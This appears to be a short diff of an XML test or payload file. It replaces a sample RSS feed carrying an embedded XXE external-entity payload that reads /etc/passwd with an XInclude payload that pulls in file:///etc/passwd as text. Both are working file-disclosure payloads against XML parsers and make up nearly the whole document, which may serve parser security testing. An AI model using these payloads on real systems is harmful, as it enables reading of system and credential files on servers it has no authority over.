@@ -1,17 +1,2 @@
-<rss version="2.0">
-<channel>
-<title>FeedForAll Sample Feed</title>
-<item>
-<title>RSS Solutions for Restaurants</title>
-<description><b>FeedForAll </b>helps R<br> <br> RSS feed uses include:<br> <i><font color="#FF0000">Daily Calendar of Events </i></font></description>
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE request [
-<!ENTITY include SYSTEM "/etc/passwd"
->
-]>
-<request>
-<description>&include;</description>
-</request>
-</item>
-</channel>
-</rss>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
